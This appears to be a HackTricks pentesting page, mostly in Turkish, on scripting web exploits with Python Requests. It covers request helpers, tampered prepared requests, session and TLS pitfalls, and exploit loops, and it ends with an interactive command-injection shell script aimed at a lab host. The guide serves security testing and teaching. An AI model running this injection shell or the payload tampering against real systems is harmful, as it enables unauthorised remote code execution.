# Web Requests

{{#include ../../banners/hacktricks-training.md}}

## Python Requests

Bu örneklerde Requests'in belgelenmiş istek bağımsız değişkenleri, response özellikleri, multipart file tuple'ları ve session'ları kullanılır.<sup>[[1]](#references)</sup> `verify=False` örnekleri TLS sertifikası doğrulamasını devre dışı bırakır ve kontrollü testlerle sınırlandırılmalıdır.<sup>[[1]](#references)</sup>
```python
import random
import re
import string

import requests

url = "http://example.com:80/some/path.php"
params = {"p1":"value1", "p2":"value2"}
headers = {"User-Agent": "fake User Agent", "Fake header": "True value"}
cookies = {"PHPSESSID": "1234567890abcdef", "FakeCookie123": "456"}
proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

#Regular Get requests sending parameters (params)
gr = requests.get(url, params=params, headers=headers, cookies=cookies, verify=False, allow_redirects=True)

code = gr.status_code
ret_headers = gr.headers
body_byte = gr.content
body_text = gr.text
ret_cookies = gr.cookies
is_redirect = gr.is_redirect
is_permanent_redirect = gr.is_permanent_redirect
float_seconds = gr.elapsed.total_seconds()

#Regular Post requests sending parameters (data)
pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)

#Json Post requests sending parameters(json)
pr = requests.post(url, json=params, headers=headers, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)

#Post request sending a file(files) and extra values
filedict = {"<FILE_PARAMETER_NAME>" : ("filename.png", open("filename.png", 'rb').read(), "image/png")}
pr = requests.post(url, data={"submit": "submit"}, files=filedict)

#Useful for presenting results in boolean/time based injections
print(f"\rflag: {flag}{char}", end="")




##### Example Functions
target = "http://10.10.10.10:8000"
proxies = {}
s = requests.Session()

def register(username, password):
resp = s.post(target + "/register", data={"username":username, "password":password, "submit": "Register"}, proxies=proxies, verify=0)
return resp

def login(username, password):
resp = s.post(target + "/login", data={"username":username, "password":password, "submit": "Login"}, proxies=proxies, verify=0)
return resp

def get_info(name):
resp = s.post(target + "/projects", data={"name":name, }, proxies=proxies, verify=0)
guid = re.match('<a href="\/info\/([^"]*)">' + name + '</a>', resp.text)[1]
return guid

def upload(guid, filename, data):
resp = s.post(target + "/upload/" + guid, data={"submit": "upload"}, files={"file":(filename, data)}, proxies=proxies, verify=0)
guid = re.match('"' + filename + '": "([^"]*)"', resp.text)[1]
return guid

def json_search(guid, search_string):
resp = s.post(target + "/api/search/" + guid + "/", json={"search":search_string}, headers={"Content-Type": "application/json"}, proxies=proxies, verify=0)
return resp.json()

def get_random_string(guid, path):
return ''.join(random.choice(string.ascii_letters) for i in range(10))
```
## Payload kontrolü için hazırlanmış istekler

Bir `PreparedRequest`, gönderilmeden önce son URL'yi, header'ları ve kodlanmış body'yi gösterir. Oturum çerezleri veya authentication uygulanması gerektiğinde, bunu `Request.prepare()` yerine `Session.prepare_request()` ile oluşturun; hazırlanmış akışın environment proxy/CA ayarlarını da dikkate alması gerektiğinde, bunları açıkça `merge_environment_settings()` ile birleştirin.<sup>[[1]](#references)</sup>
```python
s = requests.Session()
req = requests.Request("POST", url, data=b"role=user")
prepped = s.prepare_request(req)
prepped.body = b"role=admin%26debug%3D1"
prepped.headers["Content-Length"] = str(len(prepped.body))

env = s.merge_environment_settings(prepped.url, {}, None, None, None)
r = s.send(prepped, timeout=(3.05, 15), allow_redirects=False, **env)
print(r.request.headers)
print(r.request.body)
```
Bu, bir exploit standart dışı encoding gerektirdiğinde veya oluşturulan payload'u `response.request` içinde depolanan request ile karşılaştırırken kullanışlıdır. Bu, bir raw-HTTP primitive değildir: Requests, header'ları büyük/küçük harfe duyarsız bir mapping içinde depolar; bu nedenle aynı adın atanması önceki değerin üzerine yazar. Hatalı request satırları veya [HTTP request-smuggling testleri](../../pentesting-web/http-request-smuggling/README.md) için gereken birbirinden ayrı, yinelenen `Content-Length`/`Transfer-Encoding` alanları için daha düşük seviyeli bir sender kullanın.<sup>[[1]](#references)</sup>

## Session isolation, implicit credentials and TLS state

Bir session, varsayılan olarak ortam yapılandırmasına güvenir. Açık bir authentication sağlanmazsa Requests, `.netrc` dosyasından Basic credentials alabilir; ayrıca proxy yapılandırmasını ve CA bundle yollarını ortam değişkenlerinden içe aktarabilir. Saldırganın kontrolündeki URL'leri fetch eden script'lerde bu örtük girdileri devre dışı bırakın ve yalnızca amaçlanan lab proxy/CA yapılandırmasını açıkça belirtin. 2.32.4 öncesindeki sürümlerde, kötü amaçlı şekilde oluşturulmuş bir URL verildiğinde yanlış host için `.netrc` credentials seçilebiliyordu; upgrade mümkün değilse `Session.trust_env = False` belgelenmiş workaround'tur.<sup>[[1]](#references)[[4]](#references)</sup>
```python
s = requests.Session()
s.trust_env = False
s.verify = "/path/to/lab-ca.pem"  # Prefer a lab CA over verify=False
s.proxies = {
"http": "http://127.0.0.1:8080",
"https": "http://127.0.0.1:8080",
}
```
`verify=False` kullanan bir session'ı, doğrulanmış TLS gerektiren session'lardan ayrı tutun. Requests 2.32.0 öncesinde, `verify=False` ile ilk kez açılan bir connection, daha sonra aynı origin'e yapılan ve `verify=True` belirtilen requests'lerde yeniden kullanılabiliyordu; yükseltme bu pool-state sorununu düzeltir, ancak isolation exploit script'lerinin denetlenmesini de kolaylaştırır.<sup>[[5]](#references)</sup>

## Güvenilir exploit döngüleri

Requests'in varsayılan bir timeout'u yoktur. `(connect, read)` timeout'u toplam wall-clock deadline değildir: read bileşeni, client'ın alınan byte'lar arasındaki süre boyunca ne kadar bekleyeceğini sınırlar. Bir target `Location` üzerinde kontrol sahibiyse automatic redirects'i devre dışı bırakın, ardından yeni bir request göndermeden önce her hop'u doğrulayın; redirects etkinse `response.history`'yi inceleyin. Büyük veya hostile responses için `stream=True` kullanın, sınırlı boyuttaki chunk'lar üzerinden iterasyon yapın ve pooled connection'ın serbest bırakılması için response'u bir context manager ile kapatın.<sup>[[1]](#references)</sup>
```python
limit = 2 * 1024 * 1024
body = bytearray()

with s.get(url, timeout=(3.05, 10), allow_redirects=False, stream=True) as r:
print(r.status_code, r.headers.get("Location"))
for chunk in r.iter_content(64 * 1024):
if len(body) + len(chunk) > limit:
raise ValueError("response exceeds limit")
body.extend(chunk)
```
## RCE exploit etmek için Python cmd

Komut döngüsü Python'ın `Cmd` sınıfından türetilir; `default` yöntemi tanınmayan komut öneklerini işler, `cmdloop` giriş satırlarını yönlendirir ve `re.DOTALL`, çıkarma deseninin satır sonlarını kapsamasını sağlar.<sup>[[2]](#references)[[3]](#references)</sup>
```python
import requests
import re
from cmd import Cmd

class Terminal(Cmd):
prompt = "Inject => "

def default(self, args):
output = RunCmd(args)
print(output)

def RunCmd(cmd):
data = { 'db': f'lol; echo -n "MYREGEXP"; {cmd}; echo -n "MYREGEXP2"' }
r = requests.post('http://10.10.10.127/select', data=data)
page = r.text
m = re.search('MYREGEXP(.*?)MYREGEXP2', page, re.DOTALL)
if m:
return m.group(1)
else:
return 1


term = Terminal()
term.cmdloop()
```
## References

- [1] [Requests Geliştirici Arayüzü](https://requests.readthedocs.io/en/stable/api/)
- [2] [Python `cmd` — Satır tabanlı komut yorumlayıcıları desteği](https://docs.python.org/3/library/cmd.html)
- [3] [Python `re` — Düzenli ifade işlemleri](https://docs.python.org/3/library/re.html)
- [4] [Requests, kötü amaçlı URL'ler aracılığıyla `.netrc` kimlik bilgilerinin leak edilmesine karşı savunmasız](https://github.com/psf/requests/security/advisories/GHSA-9hjg-9r4m-mvj7)
- [5] [Requests `Session` nesnesi, `verify=False` ile ilk istek yapıldıktan sonra istekleri doğrulamıyor](https://github.com/psf/requests/security/advisories/GHSA-9wx4-h78v-vm56)
{{#include ../../banners/hacktricks-training.md}}
